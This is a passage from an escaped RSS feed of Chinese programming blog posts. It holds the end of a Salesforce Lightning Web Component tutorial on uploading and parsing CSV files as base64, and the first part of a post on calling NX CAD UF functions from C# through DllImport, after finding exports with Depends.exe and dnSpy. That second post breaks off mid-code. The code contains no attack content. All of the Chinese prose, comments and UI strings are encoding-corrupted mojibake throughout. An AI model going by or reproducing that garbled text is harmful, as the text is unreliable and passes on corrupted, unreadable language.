        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-layout&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;template &lt;/span&gt;&lt;span&gt;if:true&lt;/span&gt;&lt;span&gt;={showLoadingSpinner}&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-spinner &lt;/span&gt;&lt;span&gt;alternative-text&lt;/span&gt;&lt;span&gt;=&quot;Uploading now&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-spinner&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-card&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;fileUploadUsingInput.jsï¼šå› ä¸ºç”¨stringå­˜å‚¨ï¼Œæ‰€ä»¥å¯¹æ–‡ä»¶å¤§å°æœ‰å­—èŠ‚çš„é™åˆ¶ã€‚&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
import { LightningElement, track, api } from 'lwc'&lt;span&gt;;
import saveFile from &lt;/span&gt;'@salesforce/apex/FileUploadUsingInputController.saveFile'&lt;span&gt;;
import {ShowToastEvent} from &lt;/span&gt;'lightning/platformShowToastEvent'&lt;span&gt;;

export &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt; class FileUploadUsingInput extends LightningElement {
    @api recordId;
    @track fileName &lt;/span&gt;= ''&lt;span&gt;;
    @track UploadFile &lt;/span&gt;= 'Upload File'&lt;span&gt;;
    @track showLoadingSpinner &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    filesUploaded &lt;/span&gt;=&lt;span&gt; [];
    file;
    fileContents;
    fileReader;
    content;
    MAX_FILE_SIZE &lt;/span&gt;= 1500000&lt;span&gt;;

    get acceptedType() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ['.csv'&lt;span&gt;];
    }

    handleFilesChange(event) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(event.target.files.length &amp;gt; 0&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.filesUploaded =&lt;span&gt; event.target.files;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileName = event.target.files[0&lt;span&gt;].name;
        }
    }

    handleSave() {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.filesUploaded.length &amp;gt; 0&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.file = &lt;span&gt;this&lt;/span&gt;.filesUploaded[0&lt;span&gt;];
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt;.file.size &amp;gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.MAX_FILE_SIZE) {
                window.console.log(&lt;/span&gt;'æ–‡ä»¶è¿‡å¤§'&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ;
            }
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.showLoadingSpinner = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileReader= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; FileReader();

            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileReader.onloadend = (() =&amp;gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileContents = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.fileReader.result;
                let base64 &lt;/span&gt;= 'base64,'&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.content = &lt;span&gt;this&lt;/span&gt;.fileContents.indexOf(base64) +&lt;span&gt; base64.length;
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileContents = &lt;span&gt;this&lt;/span&gt;.fileContents.substring(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.content);
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.saveToFile();
            });
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileReader.readAsDataURL(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.file);
        }
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileName = 'é€‰æ‹©ä¸€ä¸ªcsvæ–‡ä»¶ä¸Šä¼ '&lt;span&gt;;
        }
    }


    saveToFile() {
        saveFile({ recordId: &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.recordId, fileName: &lt;span&gt;this&lt;/span&gt;.file.name, base64Data: encodeURIComponent(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.fileContents)})
        .then(result &lt;/span&gt;=&amp;gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.isTrue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.showLoadingSpinner = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.dispatchEvent(
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ShowToastEvent({
                    title: &lt;/span&gt;'Success!!'&lt;span&gt;,
                    message: &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.fileName + ' - ä¸Šä¼ æˆåŠŸ'&lt;span&gt;,
                    variant: &lt;/span&gt;'success'&lt;span&gt;,
                }),
            );

        })
        .&lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;(error =&amp;gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.dispatchEvent(
                &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ShowToastEvent({
                    title: &lt;/span&gt;'ä¸Šä¼ å¤±è´¥'&lt;span&gt;,
                    message: error.message,
                    variant: &lt;/span&gt;'error'&lt;span&gt;,
                }),
            );
        });
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;ç»“æœå±•ç¤ºï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. csvä¸­åšä»¥ä¸‹çš„æ•°æ®&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929183934947-896633389.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2. UIæ•ˆæœ&lt;/p&gt;
&lt;p&gt;Â &lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929184304226-1680048095.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â 3. debug logä¸­æ‰“å°å‡ºæ¥çš„å†…å®¹&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929173905771-1932323034.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;4. æ ¼å¼åŒ–ä»¥åçš„æ•ˆæœ ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹æ•°ç»„è¿›è¡ŒäºŒæ¬¡æ“ä½œï¼Œé€šè¿‡é€—å·è¿›è¡Œåˆ†å‰²å°±å¯ä»¥è·å–æ¯ä¸€ä¸ªcellå¯¹åº”çš„å€¼ï¼Œé€šå¸¸æˆ‘ä»¬è·å–æ•°æ®ä¸­çš„forå¾ªç¯ indexä¸º1ï¼Œå³è·³è¿‡é¦–è¡Œæ ‡é¢˜è¡Œã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929173916674-2105140835.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â &lt;strong&gt;æ€»ç»“ï¼š&lt;/strong&gt;ç¯‡ä¸­ä¸»è¦è®²è¿°äº†å…³äºlwcä¸­æ–‡ä»¶ä¸Šä¼ ä»¥åŠæ–‡ä»¶è§£æçš„ç®€å•æ“ä½œã€‚ç¬¬ä¸€ç§æ–¹å¼é€‚åˆå¤§æ–‡ä»¶ä¸Šä¼ ï¼Œå¯è‡ªå®šåˆ¶åŒ–ä¸å¼ºä½†åŠŸèƒ½å¼ºæ‚ã€‚ç¬¬äºŒç§æ–¹å¼å¯ä»¥å¯¹æ•°æ®åœ¨apexç«¯è¿›è¡Œç›¸å…³è§£æï¼Œä½†æ˜¯æœ‰å¤§å°çš„é™åˆ¶ã€‚ç¯‡ä¸­æœ‰é”™è¯¯åœ°æ–¹æ¬¢è¿æŒ‡å‡ºï¼Œæœ‰ä¸æ‡‚æ¬¢è¿ç•™è¨€ã€‚&lt;/p&gt;
</description>
<pubDate>Tue, 29 Sep 2020 13:57:00 +0000</pubDate>
<dc:creator>zero.zhang</dc:creator>
<og:description>æœ¬ç¯‡å‚è€ƒï¼š https://developer.salesforce.com/docs/component-library/bundle/lightning-file-upload/documenta</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zero-zyq/p/13749103.html</dc:identifier>
</item>
<item>
<title>NXäºŒæ¬¡å¼€å‘-C#ä½¿ç”¨DllImportè°ƒç”¨libufun.dllé‡Œçš„UFå‡½æ•°(åç¼–è¯‘.net.dll)è°ƒç”¨loopç­‰UFå‡½æ•° - Caesarå¢å°šå®‡</title>
<link>http://www.cnblogs.com/nxopen2018/p/13751886.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nxopen2018/p/13751886.html</guid>
<description>&lt;p&gt;åœ¨å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œæˆ‘æ­£åœ¨å¤´æ™•ï¼Œå› ä¸ºä¸‹ç­åè½¦å›å®¶ï¼Œæœ‰äº›æ™•è½¦äº†ã€‚å¤´ç–¼çš„è¦æ­»ã€‚ä¹Ÿåƒä¸ä¸‹å»é¥­ã€‚&lt;/p&gt;
&lt;p&gt;æ—©å°±æƒ³äº›è¿™ç¯‡æ–‡ç« äº†ï¼Œä½†æ˜¯æœ€è¿‘ä¸´è¿‘ä¸­ç§‹åä¸€ï¼Œæ™šä¸Šå¤ªå¿™äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;ç‰ˆæœ¬ï¼šNX11+VS2013&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æœ€è¿‘è¿™ä¸€å¹´å·²ç»ç”±C++è¿‡åº¦åˆ°C#ï¼Œæ”¹ç”¨C#åšåº”ç”¨ç¨‹åºå¼€å‘å’ŒNXäºŒæ¬¡å¼€å‘ã€‚&lt;/p&gt;
&lt;p&gt;C#åœ¨åšå¤æ‚ç•Œé¢å¼€å‘çš„æ—¶å€™ï¼ŒWinFromè¦æ¯”MFCç®€å•çš„å¤š(è¿™ä¸ªæ—¶å€™çº¯BlockUIå·²ç»æ»¡è¶³ä¸äº†é›†æˆåŠŸèƒ½çš„å¤æ‚ç•Œé¢éœ€æ±‚äº†)ï¼Œæ•°æ®åº“è¿æ¥ä¹Ÿç®€å•ã€‚&lt;/p&gt;
&lt;p&gt;è¨€å½’æ­£ä¼ &lt;/p&gt;
&lt;p&gt;åœ¨æˆ‘ç»è¿‡ä¸€æ®µæ—¶é—´çš„çœ‹QQç¾¤åˆ«äººè®¨è®ºæŠ€æœ¯ï¼Œç»™äº†æˆ‘ç‚¹å¯å‘ï¼Œä»¥åŠå¸¦ç€å…´è¶£ç™¾åº¦åˆ°äº†ä¸€äº›ç›¸å…³èµ„æ–™ã€‚å­¦ä¼šäº†è¿™ç§æ–¹æ³•ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;1.æœ‰éœ€æ±‚&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨ç”¨C#åšNXäºŒæ¬¡å¼€å‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸€èˆ¬éœ€è¦å¼•ç”¨NXå®˜æ–¹å°è£…å¥½çš„çš„è¿™å‡ ä¸ªdllã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929195655407-1597959817.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â ç”¨C#çš„ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨NXOpençš„æ¯”è¾ƒå¤šï¼Œç”¨UFçš„æ¯”è¾ƒå°‘ï¼Œå› ä¸ºUFå®˜æ–¹å°è£…çš„ä¸å…¨ï¼Œæœ‰å¾ˆå¤šæ²¡æœ‰å°è£…ã€‚ä¹Ÿå› ä¸ºC#ç”¨NXOpenè¯­è¨€ä¸Šç‰¹åˆ«ç®€å•ï¼Œå¥½ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ä¸éœ€è¦deleteï¼Œä¸éœ€è¦è¿­ä»£å™¨ï¼Œå¿«é€Ÿè½¬æ¢æˆå­—ç¬¦ä¸²ç­‰ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆåœ¨é¡¹ç›®å¼€å‘ä¸­ï¼Œå¦‚æœé‡åˆ°loopè¿™ç§å®˜æ–¹æ²¡æœ‰å°è£…çš„å‡½æ•°æ€ä¹ˆåŠï¼Ÿ&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;UF_MODL_ask_face_loops
UF_MODL_ask_loop_list_count
UF_MODL_ask_loop_list_item
UF_MODL_delete_loop_list&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;æ²¡å…³ç³»ï¼Œå®˜æ–¹æ²¡æœ‰å°è£…çš„UFå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å»è¿™5ä¸ªdllé‡Œè°ƒç”¨ã€‚ç”¨DllImportå»è°ƒç”¨(æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆç”¨è¯·è‡ªè¡Œç™¾åº¦)ã€‚&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;libufun.dll
libnxopencpp.dll
libugopenint.dll
libnxopenuicpp.dll
libopenpp.dll&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;æ¯”å¦‚ï¼Œæˆ‘ä»¬ç°åœ¨æƒ³è¦è°ƒç”¨UF_OBJ_set_colorè¿™ä¸ªå‡½æ•°(è¿™ä¸ªå‡½æ•°å®˜æ–¹å·²ç»å°è£…äº†,è¿™é‡Œåªè®²è°ƒç”¨æ˜¯æ€ä¹ˆç”¨çš„)ï¼Œç»™ä¸€ä¸ªå—è®¾ç½®é¢œè‰²ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;2.åç¼–è¯‘C.dll&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆï¼Œæ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼Œåœ¨ä¸Šé¢5ä¸ªä¸­çš„å“ªä¸ªdllé‡Œã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ—¶å°±éœ€è¦ä½¿ç”¨VCç¨‹åºçš„åç¼–è¯‘å·¥å…·Depends.exeè¿™ä¸ªå·¥å…·äº†ï¼ŒæŒ‰ä¸ªæ‰“å¼€dllï¼Œå»é‡Œé¢æ‰¾åˆ°çœ‹æœ‰æ²¡æœ‰è¿™ä¸ªå‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;åŠŸèƒ½ä»‹ç»ï¼š&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹ PE æ¨¡å—çš„å¯¼å…¥æ¨¡å—&lt;br/&gt;æŸ¥çœ‹ PE æ¨¡å—çš„å¯¼å…¥å’Œå¯¼å‡ºå‡½æ•°&lt;br/&gt;åŠ¨æ€å‰–æ PE æ¨¡å—çš„æ¨¡å—ä¾èµ–æ€§&lt;br/&gt;è§£æ C++ å‡½æ•°åç§°&lt;/p&gt;
&lt;p&gt;ç­‰ç­‰&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘å…ˆæ‰“å¼€&lt;span&gt;libufun.dll&lt;/span&gt;è¿™ä¸ªå‡½æ•°&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929201159678-483746182.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â é”™è¯¯ä¸ç”¨ç®¡ï¼Œç‚¹ç¡®å®šå…³æ‰&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929201334862-414430221.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â ç„¶ååœ¨è¿™é‡Œæ‰¾çœ‹æœ‰æ²¡æœ‰UF_OBJ_set_color&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929201717706-1735872066.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â å·²ç»æ‰¾åˆ°äº†ï¼Œæˆ‘ä»¬çŸ¥é“äº†å¯ä»¥å»è¿™ä¸ªdllé‡Œè°ƒUFå‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹ä¸€æ­¥æˆ‘ä»¬è¦å¼€å§‹å»C#é‡Œè°ƒç”¨ï¼Œä½†æ˜¯æ€ä¹ˆè°ƒç”¨ï¼Ÿä¸çŸ¥é“ï¼Ÿå¯¹å§ï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;3.åç¼–è¯‘.net.dll&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ—¶å€™åˆéœ€è¦å¦å¤–ä¸€ä¸ªåç¼–è¯‘dllå·¥å…·äº†ï¼ŒdnSpyã€‚&lt;/p&gt;
&lt;p&gt;åŠŸèƒ½ä»‹ç»ï¼š&lt;/p&gt;
&lt;p&gt;dnSpyä¸­æ–‡ç‰ˆæ˜¯ä¸€æ¬¾netç¨‹åºåç¼–è¯‘å·¥å…·ï¼Œå¯ä»¥å¯¹netç¨‹åºè¿›è¡Œåç¼–è¯‘ï¼Œè¿˜æœ‰æ›¿ä»£åº“æ–‡æ¡£çš„åŠŸèƒ½ï¼Œå¦‚æœé‡åˆ°äº†ä»£ç ä¸¢å¤±æˆ–è€…æŸåçš„æƒ…å†µï¼Œå¯ä»¥ç›´æ¥æ¢å¤ã€‚è¿˜å¯ä»¥è®¾æ–­ç‚¹åŠ è¿›ç¨‹è°ƒè¯•ä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æ‰“å¼€åæ˜¯è¿™ä¸ªæ ·å­&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929202023212-1886383364.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â ä¸‹é¢æˆ‘ä»¬æ‰“å¼€å®˜æ–¹å°è£…çš„C# NXOpen.UFè¿™ä¸ªdllï¼Œå»åç¼–è¯‘ä¸‹ï¼Œçœ‹çœ‹é‡Œé¢éƒ½å†™äº†ä»€ä¹ˆã€‚(dnSpyæ˜¯å¯ä»¥åç¼–è¯‘åˆ«äººå†™çš„æ™®é€šçš„C#exeå’Œdllçš„ï¼Œæ¡Œé¢åº”ç”¨ç¨‹åºå’ŒNXäºŒæ¬¡å¼€å‘çš„C#ç¨‹åºéƒ½å¯ä»¥åç¼–è¯‘å‡ºæ¥æºä»£ç ï¼Œåªè¦ä¸åŠ å£³ï¼ŒåŠ å£³èƒ½åç¼–è¯‘å‡ºéƒ¨åˆ†ä»£ç )&lt;/p&gt;
&lt;p&gt;æ‰“å¼€åå¦‚ä¸‹&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929202429958-1286836183.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆå»æ‰¾åˆ°å°è£…çš„UF_OBJ_set_colorè¿™ä¸ªå‡½æ•°&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929202635997-1476099505.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æ‰¾åˆ°äº†ï¼Œå®˜æ–¹æ˜¯æ€ä¹ˆè°ƒç”¨ï¼Œæ€ä¹ˆå°è£…çš„NXOpen.UF.dllçš„äº†ï¼Œæ˜¯æœ‰å‡ºå¤„çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929202732319-282179056.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;4.æˆ‘ä»¬å¦‚ä½•è°ƒç”¨&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Â æˆ‘ä»¬æŠŠè¿™å¥æŠ„ä¸‹æ¥ï¼Œå»æˆ‘ä»¬çš„NX C#é¡¹ç›®ä¸­ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
        [DllImport(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_OBJ_set_color&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
        &lt;/span&gt;&lt;span&gt;internal&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; _SetColor(Tag object_id, &lt;span&gt;int&lt;/span&gt; color);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;å…ˆåŠ å‘½åç©ºé—´&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; NXOpen;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; NXOpen.UF;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt; System.Collections.Generic;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;C# List&amp;lt;&amp;gt;çš„å‘½åç©ºé—´&lt;/span&gt;
&lt;span&gt;using&lt;/span&gt; System.Runtime.InteropServices;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;DllImportçš„å‘½åç©ºé—´&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;åœ¨æ·»åŠ ä¸€ä¸ªç±»ï¼Œå†™ä»£ç &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929203054730-422018730.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â ç„¶ååœ¨é¡¹ç›®çš„Mainå…¥å£å‡½æ•°é‡Œå†™ä»£ç ã€‚åˆ›å»ºå—-ç‰¹å¾æ‰¾ä½“-è®¾ç½®é¢œè‰²(ç”¨æˆ‘ä»¬è°ƒç”¨çš„å‡½æ•°)&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;åˆ›å»ºå—&lt;/span&gt;
FeatureSigns sign = FeatureSigns.Nullsign;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;å®šä¹‰å¸ƒå°”&lt;/span&gt;
&lt;span&gt;double&lt;/span&gt;[] cornet_pt = { &lt;span&gt;100.0&lt;/span&gt;, &lt;span&gt;0.0&lt;/span&gt;, &lt;span&gt;0.0&lt;/span&gt; };&lt;span&gt;//&lt;/span&gt;&lt;span&gt;å®šä¹‰åŸç‚¹&lt;/span&gt;
&lt;span&gt;string&lt;/span&gt;[] edge_len = { &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; };&lt;span&gt;//&lt;/span&gt;&lt;span&gt;å®šä¹‰é•¿å®½é«˜&lt;/span&gt;
Tag blk_obj_id =&lt;span&gt; Tag.Null;
theUfSession.Modl.CreateBlock1(sign, cornet_pt, edge_len, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; blk_obj_id);

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;ç‰¹å¾æ‰¾ä½“&lt;/span&gt;
Tag BodyTag =&lt;span&gt; Tag.Null;
theUfSession.Modl.AskFeatBody(blk_obj_id, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; BodyTag);

NXOpen.Utilities.JAM.StartUFCall();

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;è®¾ç½®é¢œè‰²(è°ƒç”¨UFå‡½æ•°)&lt;/span&gt;
OpenAPI._SetColor(BodyTag, &lt;span&gt;186&lt;/span&gt;&lt;span&gt;);

NXOpen.Utilities.JAM.EndUFCall();

Caesarå¢å°šå®‡
2020å¹´9æœˆ29æ—¥&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;åœ¨æˆ‘ä»¬åç¼–è¯‘çš„ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è°ƒç”¨UFå‡½æ•°çš„æ—¶å€™ï¼Œä¸€å®šè¦ç”¨&lt;/p&gt;
&lt;p&gt;NXOpen.Utilities.JAM.StartUFCall();å’ŒNXOpen.Utilities.JAM.EndUFCall();&lt;/p&gt;
&lt;p&gt;è¿™ä¸¤ä¸ªæ–¹æ³•æ¥å¼€å§‹å’Œç»“æŸï¼Œä¸­é—´è°ƒç”¨ã€‚æ‰§è¡Œæ‰æœ‰æ•ˆï¼Œè¦ä¸ç„¶æ‰§è¡Œä¸èµ·ä½œç”¨ã€‚æœ‰ç‚¹ç±»ä¼¼UFçš„&lt;/p&gt;
&lt;p&gt;UF_initializeå’ŒUF_terminate&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æ¥æ‰§è¡Œä¸‹ï¼Œæˆ‘ä»¬ä¸Šé¢çš„ä»£ç ã€‚çœ‹çœ‹æ•ˆæœã€‚ç­”æ¡ˆæ˜¯å¯ä»¥è°ƒç”¨çš„ã€‚ä¹Ÿæ˜¯è¿™ç§æ–¹æ³•è°ƒç”¨çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929204524077-1776104660.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;5.å¦‚ä½•è°ƒç”¨loopç­‰å‡½æ•°&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¥½ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“æ€ä¹ˆè°ƒç”¨å‡½æ•°äº†ï¼Œç°åœ¨æˆ‘ä»¬å»è°ƒç”¨loopé‚£äº›å‡½æ•°ã€‚å¯ä»¥å€Ÿé‰´ä¸‹å·²ç»å°è£…çš„UF_MODL_ask_list_itemæ˜¯æ€ä¹ˆå®šä¹‰è¾“å…¥è¾“å‡ºçš„ã€‚&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;72&quot;&gt;
&lt;pre&gt;
NX11+&lt;span&gt;VS2013


